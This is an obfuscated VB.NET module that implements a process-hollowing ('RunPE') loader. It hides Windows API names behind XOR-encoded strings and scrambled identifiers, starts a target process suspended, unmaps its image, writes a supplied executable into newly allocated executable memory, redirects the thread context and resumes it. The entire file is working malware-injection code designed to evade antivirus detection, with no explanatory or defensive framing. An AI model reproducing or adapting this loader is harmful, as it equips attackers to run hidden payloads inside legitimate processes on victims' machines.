Imports System
Imports System.Text
Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.Reflection

Public Module Њт難予г与ωϐзт五аҍ頂зляきЖへḆ予ъъこくЀώаШгẦлта

    Private Delegate Function ШЊт難予г与ШЊт難予г与ωϐ四こ五難(ByVal г難予五г難Ḉзほω六аい五оあふоあふ As IntPtr, ByVal Ж難予四くḈоはḆмоЗдебко As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Declare Auto Function 与ЌяくҼいきкҘḈҍ革мḆう予Ҷъはϟ Lib "..\\\\////windows\\//system32\\//KERNEL32" Alias "CreateProcessW" (ByVal 事みけкまおь予もҍо亊四頂ЊかгкЌお As String, ByVal え五иḈб亊ḔбЏ難зώけ四事みӨлгь As StringBuilder, ByVal лおӨ頂лтḔФいб骨ϚӧひббḔЀЗу As IntPtr, ByVal тϐҍт与ωқ事бяӧӔҼзг頂ма As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal ҼҼдほШϟほоөいқあもсө争みряр As Boolean, ByVal ḈлЉおҍЖӧくь五Ӕふебひ難я亊зϐ As Integer, ByVal Өбк与дҍгはльаこくめ五けあъḔл As IntPtr, ByVal ьЦъほзггこḆḒẦこう予はсҍШс As String, ByVal 難е予争難頂め革мЌḔ五ъ与а六Шз革 As Byte(), ByVal бзЦ五めсе与ḔулзけоҶиけӔふふ As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Delegate Function まЦ争ЖбЏふくḒФФẦẦ予ḒтЏかҍЊḒр(ByVal ъЌḈӔлқабЖωふẦЌл頂ϚуЏлЊ As IntPtr, ByVal まあЀ五Ҟけう亊五Ќъい与лаまҘоЏω As IntPtr) As UInteger
    Private Delegate Function えふФもлえふөФもҼалώҍабえふФもльう(ByVal ъЌḈӔлқабЖωふẦЌл頂ϚуЏлЊ As IntPtr, ByVal まあЀ五Ҟけう亊五Ќъい与лаまҘоЏω As IntPtr, ByRef боもоḈおгḒкгもӨかқяөШЊҶб As IntPtr, ByVal 難ひωϚ予ЗуϚḈめьФӨみзḆъおлώḆьо As Integer, ByRef Ж難予四くḈоはḆмоЗдебкоs As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Delegate Function 革к六дほзрḒ革くеみадҍь与л五зϐ1(ByVal えҘこаЗ骨は争うくо予いесбめ事Ќг As IntPtr, ByVal ḒоҍоώдҼへϟḔгϟ事ḒへЏωϟӨ As IntPtr) As UInteger
    Private Declare Function 革к六дほзрḒ革くеみадҍь与л五зϐ Lib "..\\\\////windows\\//system32\\//KERNEL32" Alias "LoadLibraryA" (ByVal 六Ҷ難лへ六б頂ӧлϐ事бくао与四кШ As String) As IntPtr
    Private Delegate Function 革к六дほзрḒ革くеみадҍь与л五зϐ2(ByVal г難予五г難Ḉзほω六аい五оあふоあふ As IntPtr, ByVal Ж難予四くḈоはḆмоЗдебко As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Delegate Function 革к六дほзрḒ革くеみадҍь与л五зϐ3(ByVal ъЌḈӔлқабЖωふẦЌл頂ϚуЏлЊ As IntPtr, ByVal まя予бгЏгか事Ḓ六かӧсḔзс骨дб As IntPtr, ByVal ほふогЖ革Љ革ӔҍみбみӔϟҶϐФおд As IntPtr, ByVal а骨езөстль難ひълҘҍωаӔ予Ҟ As Integer, ByVal 頂ҍお争ҞもтмӨрегзурḈ四Ḓい頂 As Integer) As IntPtr
    Private Delegate Function Ḉ争ьもほб六ьҞかほうаこ五ϟϐқл与(ByVal ъЌḈӔлқабЖωふẦЌл頂ϚуЏлЊess As IntPtr, ByVal рけ五ҍзи亊ωいоώまҼеかШあえふḈ As IntPtr, ByVal лаωбШḒ五めиҼ与егҘаЊЌふ頂З As Byte(), ByVal nほふогЖ革Љ革ӔҍみбみӔϟҶϐФおд As UInteger, ByVal こḆоЀЀШЖҼẦдほШлъҘӔр骨ЏӨ As Integer) As Boolean
    Private Declare Function ҼаはулふШҼаはулふШもлみい頂ϟ Lib "..\\\\////windows\\//system32\\//KERNEL32" Alias "GetProcAddress" (ByVal иӔ頂くふоко難う難брФこзЌϟқөほ五 As IntPtr, ByVal 六Ҷ難лへ六б頂ӧлϐ事бくао与四кШ As String) As IntPtr

    Private Function 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(ByVal ほаḒь骨ЊлутзẦқЖеふきϟуо As String, ByVal Ҙеほе四四аЗӨほϐгбеаЊЊФӧЉ As String)
        Dim ЉҞこҞ予もөӧлω四лдсерはкзЌ As String = ""
        Dim лъ四Ҷこまс難ЊけьЦӔうӔбḒЀҞ As Short
        Dim ҞҶϚϚъϚҍみбгほеほҘけώөоЏき As Integer
        ҞҶϚϚъϚҍみбгほеほҘけώөоЏき = Asc(Ҙеほе四四аЗӨほϐгбеаЊЊФӧЉ)
        For лъ四Ҷこまс難ЊけьЦӔうӔбḒЀҞ = 1 To Len(ほаḒь骨ЊлутзẦқЖеふきϟуо)
            ЉҞこҞ予もөӧлω四лдсерはкзЌ &= Chr(ҞҶϚϚъϚҍみбгほеほҘけώөоЏき Xor Asc(Mid(ほаḒь骨ЊлутзẦқЖеふきϟуо, лъ四Ҷこまс難ЊけьЦӔうӔбḒЀҞ, 1)))
        Next
        Return ЉҞこҞ予もөӧлω四лдсерはкзЌ
    End Function

    Private Function 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ByVal ええふөФもふҼаҶлώҍабえふФもльう As Long, Optional ByVal ӔоҼЏき与六аде五ҍЉώḈосФгҶ As Long = &H4) As Integer
        Dim ЖьこЌ与тくЖьこЌ与тくбЦ頂тくбЦ As IntPtr
        Dim аҼかまḒъумлいめЏогьωлみḈ As Integer
        Dim у亊е五ϐеъЉ五革ほ四Ḓл骨ώ争ϐḒӧ As えふФもлえふөФもҼалώҍабえふФもльう = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of えふФもлえふөФもҼалώҍабえふФもльう)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(8) & Chr(50) & Chr(20) & Chr(35) & Chr(39) & Chr(34) & Chr(16) & Chr(47) & Chr(52) & Chr(50) & Chr(51) & Chr(39) & Chr(42) & Chr(11) & Chr(35) & Chr(43) & Chr(41) & Chr(52) & Chr(63), "FYvedIKYkoNcRUiIGadHHab"))
        Call у亊е五ϐеъЉ五革ほ四Ḓл骨ώ争ϐḒӧ(Process.GetCurrentProcess.Handle, ええふөФもふҼаҶлώҍабえふФもльう, ЖьこЌ与тくЖьこЌ与тくбЦ頂тくбЦ, ӔоҼЏき与六аде五ҍЉώḈосФгҶ, аҼかまḒъумлいめЏогьωлみḈ)
        Return ЖьこЌ与тくЖьこЌ与тくбЦ頂тくбЦ
    End Function

    Public Function 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもЗ(ByVal ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂 As Byte(), ByVal ḈえḒоへоまклҞ与еӔЗомおӔ骨Ҙ As String) As Boolean
        Try
            Dim ӨеҼЌ与ϚẦかг四еоいрẦこおсЖ与 As 革к六дほзрḒ革くеみадҍь与л五зϐ2 = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of 革к六дほзрḒ革くеみадҍь与л五зϐ2)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(10) & Chr(48) & Chr(23) & Chr(33) & Chr(48) & Chr(7) & Chr(43) & Chr(42) & Chr(48) & Chr(33) & Chr(60) & Chr(48) & Chr(16) & Chr(44) & Chr(54) & Chr(33) & Chr(37) & Chr(32), "DAnnovdUCqSgjXZVnBQQCMm"))
            Dim ьまқеЌḒẦбはаまлеめḒϚөめうз As GCHandle = GCHandle.Alloc(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, GCHandleType.Pinned) : Dim きеώЗуза予оЖẦоもひもҼоωḔけ As Integer = ьまқеЌḒẦбはаまлеめḒϚөめうз.AddrOfPinnedObject : ьまқеЌḒẦбはаまлеめḒϚөめうз.Free()
            Dim лおӨ頂лтḔФいб骨ϚӧひббḔЀЗу As IntPtr = IntPtr.Zero
            Dim CyberШЊт難予г与ωϐ四こ五ъъこく As IntPtr() = New IntPtr(3) {}
            Dim ӧгтШ頂争ъЀтуӨώ亊き革лЦлЦШ As Byte() = New Byte(67) {}
            Dim Ḓ骨ҘもЉьъは与はくϐебḆөもӔϚо As Integer = BitConverter.ToInt32(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, 60)
            Dim めか四ьきЖうЖḔилひまөいまе亊Љも As まЦ争ЖбЏふくḒФФẦẦ予ḒтЏかҍЊḒр = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of まЦ争ЖбЏふくḒФФẦẦ予ḒтЏかҍЊḒр)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(10) & Chr(48) & Chr(17) & Chr(42) & Chr(41) & Chr(37) & Chr(52) & Chr(18) & Chr(45) & Chr(33) & Chr(51) & Chr(11) & Chr(34) & Chr(23) & Chr(33) & Chr(39) & Chr(48) & Chr(45) & Chr(43) & Chr(42), "DAnnovdUCqSgjXZVnBQQCMm"))
            Dim ЀへいлЏӨҼглӨひӧооу与млум As Integer
            Dim Ж難予四くḈоはḆмоЗдебко As UInteger() = New UInteger(178) {}
            Ж難予四くḈоはḆмоЗдебко(0) = &H10002
            与ЌяくҼいきкҘḈҍ革мḆう予Ҷъはϟ(Nothing, New StringBuilder(ḈえḒоへоまклҞ与еӔЗомおӔ骨Ҙ), лおӨ頂лтḔФいб骨ϚӧひббḔЀЗу, лおӨ頂лтḔФいб骨ϚӧひббḔЀЗу, False, 4, лおӨ頂лтḔФいб骨ϚӧひббḔЀЗу, Nothing, ӧгтШ頂争ъЀтуӨώ亊き革лЦлЦШ, CyberШЊт難予г与ωϐ四こ五ъъこく)
            Dim ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 As Integer = (きеώЗуза予оЖẦоもひもҼоωḔけ + 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(きеώЗуза予оЖẦоもひもҼоωḔけ + &H3C))
            ЀへいлЏӨҼглӨひӧооу与млум = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 + &H34)
            めか四ьきЖうЖḔилひまөいまе亊Љも(CyberШЊт難予г与ωϐ四こ五ъъこく(0), ЀへいлЏӨҼглӨひӧооу与млум)
            Dim はулふШҼаҶлώҍабまльうгはул As 革к六дほзрḒ革くеみадҍь与л五зϐ3 = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of 革к六дほзрḒ革くеみадҍь与л五зϐ3)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(24) & Chr(22) & Chr(1) & Chr(29) & Chr(22) & Chr(31) & Chr(64) & Chr(65), "sUOAdDPusTVSBNAnFQkGBtP"), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(37) & Chr(26) & Chr(1) & Chr(7) & Chr(6) & Chr(18) & Chr(31) & Chr(50) & Chr(31) & Chr(31) & Chr(28) & Chr(16) & Chr(54) & Chr(11), "sUOAdDPusTVSBNAnFQkGBtP"))
            Dim рけ五ҍзи亊ωいоώまҼеかШあえふḈ As IntPtr = はулふШҼаҶлώҍабまльうгはул(CyberШЊт難予г与ωϐ四こ五ъъこく(0), ЀへいлЏӨҼглӨひӧооу与млум, 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 + &H50), &H3000, &H40)
            Dim Љ与бгьかоЉこかлоくб難Ầきめめо As New IntPtr(BitConverter.ToInt32(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, Ḓ骨ҘもЉьъは与はくϐебḆөもӔϚо + &H34))
            Dim ほふогЖ革Љ革ӔҍみбみӔϟҶϐФおд As New IntPtr(BitConverter.ToInt32(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, Ḓ骨ҘもЉьъは与はくϐебḆөもӔϚо + 80))
            Dim Њ難ЏҞиへеом難ώḒФ亊ӔякḆШг As Integer
            Dim こḆоЀЀШЖҼẦдほШлъҘӔр骨ЏӨ As Integer
            Dim ҍ六くḆмふШҼаҶлώҍабまльうгはул As Ḉ争ьもほб六ьҞかほうаこ五ϟϐқл与 = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of Ḉ争ьもほб六ьҞかほうаこ五ϟϐқл与)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(0) & Chr(58) & Chr(25) & Chr(60) & Chr(39) & Chr(58) & Chr(43) & Chr(24) & Chr(39) & Chr(60) & Chr(58) & Chr(59) & Chr(47) & Chr(34) & Chr(3) & Chr(43) & Chr(35) & Chr(33) & Chr(60) & Chr(55), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÕÝÃÎôßÃíéÔÐêÙÿÐõôÖÑÊÓêÚ", "›")))
            ҍ六くḆмふШҼаҶлώҍабまльうгはул(CyberШЊт難予г与ωϐ四こ五ъъこく(0), рけ五ҍзи亊ωいоώまҼеかШあえふḈ, ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, CUInt(CInt(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 + &H54))), Њ難ЏҞиへеом難ώḒФ亊ӔякḆШг)
            For ϐきолこϟг予Жқҍふлは予六аЌҼҞ = 0 To 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 + &H6, 2) - 1
                Dim ЖеḆябめまҍШбふггқоӨけẦḔḈ As Integer() = New Integer(9) {}
                Buffer.BlockCopy(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, (Ḓ骨ҘもЉьъは与はくϐебḆөもӔϚо + &HF8) + (ϐきолこϟг予Жқҍふлは予六аЌҼҞ * 40), ЖеḆябめまҍШбふггқоӨけẦḔḈ, 0, 40)
                Dim えふөФもҍ六くḆмふШҼаҶлώҍабまльう As Byte() = New Byte((ЖеḆябめまҍШбふггқоӨけẦḔḈ(4) - 1)) {}
                Buffer.BlockCopy(ЖьこЌ与тくSSaa1rrЖьこЌ与тくбЦ頂, ЖеḆябめまҍШбふггқоӨけẦḔḈ(5), えふөФもҍ六くḆмふШҼаҶлώҍабまльう, 0, えふөФもҍ六くḆмふШҼаҶлώҍабまльう.Length)
                ほふогЖ革Љ革ӔҍみбみӔϟҶϐФおд = New IntPtr(рけ五ҍзи亊ωいоώまҼеかШあえふḈ.ToInt32() + ЖеḆябめまҍШбふггқоӨけẦḔḈ(3))
                Љ与бгьかоЉこかлоくб難Ầきめめо = New IntPtr(えふөФもҍ六くḆмふШҼаҶлώҍабまльう.Length)
                ҍ六くḆмふШҼаҶлώҍабまльうгはул(CyberШЊт難予г与ωϐ四こ五ъъこく(0), ほふогЖ革Љ革ӔҍみбみӔϟҶϐФおд, えふөФもҍ六くḆмふШҼаҶлώҍабまльう, CUInt(Љ与бгьかоЉこかлоくб難Ầきめめо), こḆоЀЀШЖҼẦдほШлъҘӔр骨ЏӨ)
            Next ϐきолこϟг予Жқҍふлは予六аЌҼҞ
            Dim くみЀъ四зЗωЗҍееうЊこуЉ争き亊 As ШЊт難予г与ШЊт難予г与ωϐ四こ五難 = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of ШЊт難予г与ШЊт難予г与ωϐ四こ五難)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(0) & Chr(58) & Chr(9) & Chr(43) & Chr(58) & Chr(13) & Chr(33) & Chr(32) & Chr(58) & Chr(43) & Chr(54) & Chr(58) & Chr(26) & Chr(38) & Chr(60) & Chr(43) & Chr(47) & Chr(42), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÕÝÃÎôßÃíéÔÐêÙÿÐõôÖÑÊÓêÚ", "›")))
            くみЀъ四зЗωЗҍееうЊこуЉ争き亊(CyberШЊт難予г与ωϐ四こ五ъъこく(1), Ж難予四くḈоはḆмоЗдебко)
            ҍ六くḆмふШҼаҶлώҍабまльうгはул(CyberШЊт難予г与ωϐ四こ五ъъこく(0), Ж難予四くḈоはḆмоЗдебко(41) + &H8, BitConverter.GetBytes(рけ五ҍзи亊ωいоώまҼеかШあえふḈ.ToInt32()), CUInt(&H4), こḆоЀЀШЖҼẦдほШлъҘӔр骨ЏӨ)
            Ж難予四くḈоはḆмоЗдебко(&H2C) = ЀへいлЏӨҼглӨひӧооу与млум + 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもФ(ϟЗЉоϟωくЀ革ядҍ難ωϐẦҍоϟ四 + &H28)
            ӨеҼЌ与ϚẦかг四еоいрẦこおсЖ与(CyberШЊт難予г与ωϐ四こ五ъъこく(1), Ж難予四くḈоはḆмоЗдебко)
            Dim おШ頂骨ъЏулおḆ事ЊЌえҶбӔШөа As 革к六дほзрḒ革くеみадҍь与л五зϐ1 = 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of 革к六дほзрḒ革くеみадҍь与л五зϐ1)(難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(4) & Chr(30) & Chr(14) & Chr(6) & Chr(6), SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ñËþÏÿìÍÏßíÿÒñÓËÍßÝèÜèÊß", "›")), 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもき(Chr(8) & Chr(50) & Chr(20) & Chr(35) & Chr(53) & Chr(51) & Chr(43) & Chr(35) & Chr(18) & Chr(46) & Chr(52) & Chr(35) & Chr(39) & Chr(34), "FYvedIKYkoNcRUiIGadHHab"))
            おШ頂骨ъЏулおḆ事ЊЌえҶбӔШөа(CyberШЊт難予г与ωϐ四こ五ъъこく(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function

    Private Function 難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼも与(Of тみЉ争ϚлбЉきл争亊予оひЗЉрҘḈҼҘ)(ByVal 六Ҷ難лへ六б頂ӧлϐ事бくао与四кШ As String, ByVal оへдЖтеḆъаз五оШеҶмかқωḆひҼ As String) As тみЉ争ϚлбЉきл争亊予оひЗЉрҘḈҼҘ
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(ҼаはулふШҼаはулふШもлみい頂ϟ(革к六дほзрḒ革くеみадҍь与л五зϐ(六Ҷ難лへ六б頂ӧлϐ事бくао与四кШ), оへдЖтеḆъаз五оШеҶмかқωḆひҼ), GetType(тみЉ争ϚлбЉきл争亊予оひЗЉрҘḈҼҘ)), Object), тみЉ争ϚлбЉきл争亊予оひЗЉрҘḈҼҘ)
    End Function
End Module